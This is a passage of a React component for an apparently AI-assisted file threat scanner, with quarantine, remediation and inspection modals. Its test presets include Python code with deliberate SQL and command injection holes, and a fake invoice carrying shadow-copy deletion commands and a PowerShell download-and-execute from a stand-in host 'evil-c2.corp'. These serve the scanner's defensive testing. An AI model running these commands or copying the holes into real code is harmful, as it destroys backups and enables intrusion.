            <div className="px-2.5 py-1.5 border-b border-white/[0.06]">
              <div className="text-[10px] font-mono text-white truncate font-medium">
                {contextMenu.quarantinedFile.filename}
              </div>
              <div className="text-[9px] text-amber-400 font-mono flex items-center gap-1 mt-0.5">
                <Lock className="w-2.5 h-2.5" />
                <span>Isolated in .quarantine/</span>
              </div>
            </div>

            {/* 1. Restore */}
            <button
              onClick={() => {
                handleRestoreQuarantined(contextMenu.quarantinedFile!);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-emerald-300 hover:bg-emerald-500/20 transition-all text-xs font-medium"
            >
              <RotateCcw className="w-3.5 h-3.5 text-emerald-400" />
              <span>Restore File</span>
            </button>

            {/* 2. Add to exclusion and restore */}
            <button
              onClick={() => {
                handleRestoreAndExclude(contextMenu.quarantinedFile!);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-cyan-300 hover:bg-cyan-500/20 transition-all text-xs font-medium"
            >
              <ShieldCheck className="w-3.5 h-3.5 text-cyan-400" />
              <span>Add to Exclusion & Restore</span>
            </button>

            {/* 3. Deep AI Forensic Re-Scan */}
            <button
              onClick={() => {
                handleDeepScanQuarantined(contextMenu.quarantinedFile!);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-purple-300 hover:bg-purple-500/20 transition-all text-xs"
            >
              <Sparkles className="w-3.5 h-3.5 text-purple-400" />
              <span>Deep AI Forensic Re-Scan</span>
            </button>

            {/* 4. Inspect Raw Hex & Entropy */}
            <button
              onClick={() => {
                setSelectedQuarantinedForInspect(contextMenu.quarantinedFile);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-slate-200 hover:bg-white/[0.08] transition-all text-xs"
            >
              <Eye className="w-3.5 h-3.5 text-blue-400" />
              <span>Inspect Raw Hex & Entropy</span>
            </button>

            {/* 5. Copy SHA-256 Hash */}
            {contextMenu.quarantinedFile.sha256 && (
              <button
                onClick={() => {
                  handleCopySha256(contextMenu.quarantinedFile!.sha256 || "");
                  setContextMenu(prev => ({ ...prev, visible: false }));
                }}
                className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-slate-300 hover:bg-white/[0.08] transition-all text-xs"
              >
                <Copy className="w-3.5 h-3.5 text-slate-400" />
                <span>Copy SHA-256 Hash</span>
              </button>
            )}

            <div className="border-t border-white/[0.06] my-1" />

            {/* 6. Delete (Purge) */}
            <button
              onClick={() => {
                handlePurgeQuarantined(contextMenu.quarantinedFile!);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-rose-400 hover:bg-rose-500/20 transition-all text-xs font-semibold"
            >
              <Trash2 className="w-3.5 h-3.5 text-rose-400" />
              <span>Delete Permanently</span>
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* =================================================================== */}
      {/* MODAL: LIVE FILE ADDITION (User asked to test live additions)        */}
      {/* =================================================================== */}
      {showCreateModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="apple-panel max-w-lg w-full p-6 space-y-4 shadow-2xl text-xs border border-white/[0.12]">
            <div className="flex items-center justify-between border-b border-white/[0.08] pb-3">
              <div className="flex items-center gap-2 text-white">
                <Plus className="w-4 h-4 text-blue-400" />
                <h3 className="font-semibold text-sm">Add New File to Workspace</h3>
              </div>
              <button
                onClick={() => setShowCreateModal(false)}
                className="p-1 rounded-lg hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Quick Templates Chips */}
            <div className="space-y-1.5">
              <span className="text-[10px] text-[#8E8E93] uppercase font-semibold">Quick Presets:</span>
              <div className="flex flex-wrap gap-1.5">
                <button
                  type="button"
                  onClick={() => {
                    setNewFileName("user_database_lookup.py");
                    setNewFileContent(
                      `import sqlite3\n\ndef get_user_data(username):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    # Unsafe: Direct string concatenation allows SQL injection\n    query = f"SELECT * FROM users WHERE username = '{username}'"\n    cursor.execute(query)\n    return cursor.fetchall()`
                    );
                  }}
                  className="px-2.5 py-1 rounded-lg bg-amber-500/15 text-amber-300 border border-amber-500/30 text-[10px] font-medium"
                >
                  Vulnerable Code: SQL Injection
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setNewFileName("system_backup_runner.py");
                    setNewFileContent(
                      `import os\n\ndef run_backup(user_path):\n    # Unsafe: Command injection via shell command string\n    os.system(f"tar -czf backup.tar.gz {user_path}")`
                    );
                  }}
                  className="px-2.5 py-1 rounded-lg bg-amber-500/15 text-amber-300 border border-amber-500/30 text-[10px] font-medium"
                >
                  Vulnerable Code: Command Injection
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setNewFileName("harmless_looking_invoice.txt");
                    setNewFileContent(
                      `# Enterprise Invoice #88412\n# [Hidden Malicious Shadow Copy Deletion Payload]\nvssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n$wc = New-Object System.Net.WebClient\n$wc.DownloadString('http://evil-c2.corp/drop.ps1') | IEX`
                    );
                  }}
                  className="px-2.5 py-1 rounded-lg bg-rose-500/15 text-rose-300 border border-rose-500/30 text-[10px] font-medium"
                >
                  Safe Name, Harmful Content
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setNewFileName("malware_analysis_lecture.txt");
                    setNewFileContent(
                      `Cybersecurity Lecture Notes: Module 4\nSubject: Malware & Trojan Analysis\nKey Takeaways:\n1. Never execute untrusted binaries.\n2. Ensure endpoints maintain real-time EDR telemetry.\n3. Monitor PowerShell execution policies.\nAll students must submit homework by Friday.`
                    );
                  }}
                  className="px-2.5 py-1 rounded-lg bg-emerald-500/15 text-emerald-300 border border-emerald-500/30 text-[10px] font-medium"
                >
                  Threat Name, Clean Content
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setNewFileName("clean_invoice_doc.txt");
                    setNewFileContent(
                      `Enterprise Procurement Invoice #99402\nVendor: Global Cybersecurity Corp\nTotal: $12,500.00\nPayment Terms: Net 30\nApproved by IT Director.`
                    );
                  }}
                  className="px-2.5 py-1 rounded-lg bg-emerald-500/15 text-emerald-300 border border-emerald-500/30 text-[10px] font-medium"
                >
                  Clean Document
                </button>
              </div>
            </div>

            <div>
              <label className="block text-[#8E8E93] text-[11px] mb-1">Filename:</label>
              <input
                type="text"
                value={newFileName}
                onChange={(e) => setNewFileName(e.target.value)}
                placeholder="e.g. test_script.ps1"
                className="w-full px-3 py-1.5 rounded-xl bg-black/40 border border-white/[0.1] text-white focus:outline-none focus:border-blue-500/50 text-xs font-mono"
              />
            </div>

            <div>
              <label className="block text-[#8E8E93] text-[11px] mb-1">File Contents:</label>
              <textarea
                value={newFileContent}
                onChange={(e) => setNewFileContent(e.target.value)}
                rows={6}
                className="w-full p-3 rounded-xl bg-black/40 border border-white/[0.1] text-slate-200 font-mono text-[11px] focus:outline-none focus:border-blue-500/50 leading-relaxed"
              />
            </div>

            <div className="pt-2 border-t border-white/[0.08] flex justify-end gap-2">
              <button
                type="button"
                onClick={() => setShowCreateModal(false)}
                className="px-3.5 py-1.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
              >
                Cancel
              </button>
              <button
                type="button"
                onClick={handleCreateNewFile}
                className="px-4 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-semibold"
              >
                Save & Auto-Analyze
              </button>
            </div>
          </div>
        </div>
      )}

            {/* =================================================================== */}
      {/* MODAL: CREATE NEW FOLDER (Inside current Explorer subpath)          */}
      {/* =================================================================== */}
      {showCreateFolderModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="apple-panel max-w-md w-full p-6 space-y-4 shadow-2xl text-xs border border-white/[0.12]">
            <div className="flex items-center justify-between border-b border-white/[0.08] pb-3">
              <div className="flex items-center gap-2 text-white">
                <FolderPlus className="w-4 h-4 text-blue-400" />
                <h3 className="font-semibold text-sm">Create New Folder</h3>
              </div>
              <button
                onClick={() => {
                  setShowCreateFolderModal(false);
                  setNewFolderName("");
                }}
                className="p-1 rounded-lg hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div>
              <p className="text-[#8E8E93] text-[11px] mb-3">
                Location: <code className="text-blue-300 font-mono px-1.5 py-0.5 rounded bg-black/40">monitored_workspace/{explorerPath || ""}</code>
              </p>
              <label className="block text-[#8E8E93] text-[11px] mb-1">Folder Name:</label>
              <input
                type="text"
                value={newFolderName}
                onChange={(e) => setNewFolderName(e.target.value)}
                placeholder="e.g. logs_vault or quarantine_zone"
                className="w-full px-3 py-1.5 rounded-xl bg-black/40 border border-white/[0.1] text-white focus:outline-none focus:border-blue-500/50 text-xs font-mono"
                autoFocus
                onKeyDown={(e) => {
                  if (e.key === "Enter" && newFolderName.trim()) {
                    handleCreateFolder();
                  }
                }}
              />
            </div>

            <div className="pt-2 border-t border-white/[0.08] flex justify-end gap-2">
              <button
                type="button"
                onClick={() => {
                  setShowCreateFolderModal(false);
                  setNewFolderName("");
                }}
                className="px-3.5 py-1.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
              >
                Cancel
              </button>
              <button
                type="button"
                onClick={handleCreateFolder}
                disabled={!newFolderName.trim()}
                className="px-4 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-500 disabled:opacity-40 text-white font-semibold flex items-center gap-1.5"
              >
                <FolderPlus className="w-3.5 h-3.5" />
                <span>Create Folder</span>
              </button>
            </div>
          </div>
        </div>
      )}

            {/* =================================================================== */}
      {/* MODAL: SAST VULNERABILITY REMEDIATION MODAL                         */}
      {/* =================================================================== */}
      {remediationModal.visible && remediationModal.file && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="apple-panel max-w-2xl w-full p-6 space-y-4 shadow-2xl text-xs border border-amber-500/30">
            {/* Header */}
            <div className="flex items-center justify-between border-b border-white/[0.08] pb-3">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-xl bg-amber-500/20 flex items-center justify-center text-amber-400">
                  <Wrench className="w-4 h-4" />
                </div>
                <div>
                  <h3 className="font-semibold text-white text-sm">
                    Security Vulnerability Remediation
                  </h3>
                  <div className="flex items-center gap-2 text-[10px] text-[#8E8E93] mt-0.5">
                    <span className="font-mono text-amber-300">
                      {remediationModal.file.vulnerability_details?.title || "Vulnerable Code"}
                    </span>
                    <span>•</span>
                    <span className="font-mono text-slate-300">
                      {remediationModal.file.vulnerability_details?.cwe || "CWE-89"}
                    </span>
                    <span>•</span>
                    <span className="px-1.5 py-0.2 rounded-full bg-amber-500/20 text-amber-300 font-semibold text-[9px]">
                      {remediationModal.file.vulnerability_details?.severity || "HIGH"} RISK ({remediationModal.file.risk_score}/100)
                    </span>
                  </div>
                </div>
              </div>
              <button
                onClick={() => setRemediationModal({ visible: false, file: null, isApplying: false })}
                className="p-1 rounded-lg hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Explanation & Remediation Strategy */}
            <div className="p-3.5 rounded-xl bg-amber-500/[0.06] border border-amber-500/25 space-y-1.5 text-xs">
              <span className="text-[10px] uppercase font-semibold text-amber-400 tracking-wider">
                Vulnerability Analysis & Recommendation
              </span>
              <p className="text-slate-200 text-[11px] leading-relaxed">
                {remediationModal.file.vulnerability_details?.description || "Insecure code construct permits adversarial manipulation."}
              </p>
              <div className="pt-1 text-[11px] text-emerald-300 flex items-center gap-1.5">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400 flex-shrink-0" />
                <span>
                  <strong>Recommended Fix:</strong> {remediationModal.file.vulnerability_details?.recommended_mitigation || "Apply parameterized query pattern."}
                </span>
              </div>
            </div>

            {/* Before vs After Code Diff */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
              {/* Flawed Code */}
              <div className="space-y-1">
                <div className="flex items-center justify-between text-[10px]">
                  <span className="text-rose-400 font-semibold flex items-center gap-1">
                    <AlertTriangle className="w-3 h-3" />
                    <span>Insecure Code (Detected Flaw)</span>
                  </span>
                  {remediationModal.file.vulnerability_details?.line_no && (
                    <span className="text-slate-500 font-mono">
                      Line {remediationModal.file.vulnerability_details.line_no}
                    </span>
                  )}
                </div>
                <pre className="p-3 rounded-xl bg-rose-950/30 border border-rose-500/30 font-mono text-[10px] text-rose-200 overflow-auto h-36 leading-relaxed">
                  {remediationModal.file.vulnerability_details?.line_content || remediationModal.file.content_preview}
                </pre>
              </div>

              {/* Remediated Safe Code */}
              <div className="space-y-1">
                <div className="flex items-center justify-between text-[10px]">
                  <span className="text-emerald-400 font-semibold flex items-center gap-1">
                    <CheckCircle2 className="w-3 h-3" />
                    <span>Remediated Secure Code (Drop-in)</span>
                  </span>
                  <span className="text-emerald-500 font-mono text-[9px]">Verified Safe</span>
                </div>
                <pre className="p-3 rounded-xl bg-emerald-950/30 border border-emerald-500/30 font-mono text-[10px] text-emerald-200 overflow-auto h-36 leading-relaxed">
                  {remediationModal.file.suggested_patch || "# Parameterized query pattern applied"}
                </pre>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="pt-3 border-t border-white/[0.08] flex items-center justify-between">
              <button
                type="button"
                onClick={() => {
                  navigator.clipboard.writeText(remediationModal.file?.suggested_patch || "");
                  toast.success("Remediated code copied to clipboard!");
                }}
                className="px-3 py-1.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.08] text-[#8E8E93] hover:text-white flex items-center gap-1.5 transition-all text-xs"
              >
                <Copy className="w-3.5 h-3.5" />
                <span>Copy Safe Code</span>
              </button>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => setRemediationModal({ visible: false, file: null, isApplying: false })}
                  className="px-3.5 py-1.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
                >
                  Close
                </button>
                <button
                  type="button"
                  onClick={() => handleApplyVulnerabilityRemediation(remediationModal.file!)}
                  className="px-4 py-1.5 rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-semibold flex items-center gap-1.5 shadow-md shadow-emerald-950/40"
                >
                  <Wrench className="w-3.5 h-3.5" />
                  <span>Apply Security Patch to Workspace</span>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* MODAL: QUARANTINED ARTIFACT FORENSIC INSPECTION & ACTIONS           */}
      {/* =================================================================== */}
      {selectedQuarantinedForInspect && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="apple-panel max-w-2xl w-full p-6 space-y-4 shadow-2xl text-xs border border-amber-500/30">
            {/* Modal Header */}
            <div className="flex items-center justify-between border-b border-white/[0.08] pb-3">
              <div className="flex items-center gap-2.5 text-white">
                <div className="w-8 h-8 rounded-xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center">
                  <Lock className="w-4 h-4 text-amber-400" />
                </div>
                <div>
                  <h3 className="font-semibold text-sm text-white flex items-center gap-2">
                    <span>{selectedQuarantinedForInspect.filename}</span>
                    <span className="px-2 py-0.5 rounded-full bg-rose-500/20 text-rose-300 font-mono text-[9px] border border-rose-500/30">
                      QUARANTINED ARTIFACT
                    </span>
                  </h3>
                  <p className="text-[10px] text-[#8E8E93] font-mono">
                    {selectedQuarantinedForInspect.quarantine_path}
                  </p>
                </div>
              </div>
              <button
                onClick={() => setSelectedQuarantinedForInspect(null)}
                className="p-1.5 rounded-lg hover:bg-white/[0.08] text-[#8E8E93] hover:text-white transition-colors"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Forensics Meta Grid */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
              <div className="p-2.5 rounded-xl bg-white/[0.02] border border-white/[0.06]">
                <span className="text-[10px] text-[#8E8E93] block">Original Path</span>
                <span className="font-mono text-white text-[11px] truncate block" title={selectedQuarantinedForInspect.original_path}>
                  {selectedQuarantinedForInspect.original_path || `monitored_workspace/${selectedQuarantinedForInspect.filename}`}
                </span>
              </div>
              <div className="p-2.5 rounded-xl bg-white/[0.02] border border-white/[0.06]">
                <span className="text-[10px] text-[#8E8E93] block">File Size</span>
                <span className="font-mono text-white text-[11px] block">
                  {(selectedQuarantinedForInspect.size_bytes / 1024).toFixed(2)} KB ({selectedQuarantinedForInspect.size_bytes} bytes)
                </span>
              </div>
              <div className="p-2.5 rounded-xl bg-white/[0.02] border border-white/[0.06]">
                <span className="text-[10px] text-[#8E8E93] block">Shannon Entropy</span>
                <span className={`font-mono font-semibold text-[11px] block ${
                  (selectedQuarantinedForInspect.entropy || 0) > 7 ? "text-rose-400" : "text-amber-400"
                }`}>
                  {selectedQuarantinedForInspect.entropy ?? "Calculating"}
                </span>
              </div>
              <div className="p-2.5 rounded-xl bg-white/[0.02] border border-white/[0.06]">
                <span className="text-[10px] text-[#8E8E93] block">Enclave Isolation</span>
                <span className="font-mono text-emerald-400 text-[11px] block">chmod 000 (Defused)</span>
              </div>
            </div>

            {/* SHA-256 Hash Card */}
            {selectedQuarantinedForInspect.sha256 && (
              <div className="p-3 rounded-xl bg-black/40 border border-white/[0.08] flex items-center justify-between gap-3">
                <div className="min-w-0 flex-1">
                  <span className="text-[10px] uppercase font-semibold text-[#8E8E93] block">SHA-256 Checksum</span>
                  <span className="font-mono text-[11px] text-cyan-300 break-all select-all">
                    {selectedQuarantinedForInspect.sha256}
                  </span>
                </div>
                <button
                  onClick={() => handleCopySha256(selectedQuarantinedForInspect!.sha256!)}
                  className="px-2.5 py-1.5 rounded-lg bg-white/[0.06] hover:bg-white/[0.1] text-slate-300 hover:text-white flex items-center gap-1.5 text-xs font-medium"
                >
                  <Copy className="w-3.5 h-3.5" />
                  <span>{copiedSha256 ? "Copied" : "Copy"}</span>
                </button>
              </div>
            )}

            {/* Content Preview / Raw Hex */}
            <div className="space-y-1.5">
              <span className="text-[10px] text-[#8E8E93] uppercase font-semibold">Defused Content Preview:</span>
              <pre className="p-3.5 rounded-xl bg-black/60 border border-white/[0.08] font-mono text-[11px] text-slate-300 max-h-44 overflow-y-auto leading-relaxed select-all">
                {selectedQuarantinedForInspect.content_preview || "[Binary / Non-text payload isolated]"}
              </pre>
            </div>

            {/* Action Bar inside Modal */}
            <div className="pt-3 border-t border-white/[0.08] flex flex-wrap items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                {/* 1. Restore */}
                <button
                  type="button"
                  onClick={async () => {
                    await handleRestoreQuarantined(selectedQuarantinedForInspect!);
                    setSelectedQuarantinedForInspect(null);
                  }}
                  className="px-3 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-semibold flex items-center gap-1.5"
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                  <span>Restore File</span>
                </button>

                {/* 2. Add to exclusion and restore */}
                <button
                  type="button"
                  onClick={async () => {
                    await handleRestoreAndExclude(selectedQuarantinedForInspect!);
                    setSelectedQuarantinedForInspect(null);
                  }}
                  className="px-3 py-1.5 rounded-xl bg-cyan-600/30 hover:bg-cyan-600/40 text-cyan-200 border border-cyan-500/40 font-semibold flex items-center gap-1.5"
                >
                  <ShieldCheck className="w-3.5 h-3.5" />
                  <span>Add to Exclusion & Restore</span>
                </button>

                {/* 3. Deep Forensic Re-Scan */}
                <button
                  type="button"
                  onClick={() => handleDeepScanQuarantined(selectedQuarantinedForInspect!)}
                  className="px-3 py-1.5 rounded-xl bg-purple-600/30 hover:bg-purple-600/40 text-purple-200 border border-purple-500/40 font-semibold flex items-center gap-1.5"
                >
                  <Sparkles className="w-3.5 h-3.5" />
                  <span>Deep Re-Scan</span>
                </button>
              </div>

              <div className="flex items-center gap-2">
                {/* 4. Delete / Purge */}
                <button
                  type="button"
                  onClick={async () => {
                    await handlePurgeQuarantined(selectedQuarantinedForInspect!);
                    setSelectedQuarantinedForInspect(null);
                  }}
                  className="px-3 py-1.5 rounded-xl bg-rose-600/30 hover:bg-rose-600/40 text-rose-300 border border-rose-500/40 font-semibold flex items-center gap-1.5"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  <span>Delete Permanently</span>
                </button>

                <button
                  type="button"
                  onClick={() => setSelectedQuarantinedForInspect(null)}
                  className="px-3.5 py-1.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default FileThreatScannerView;
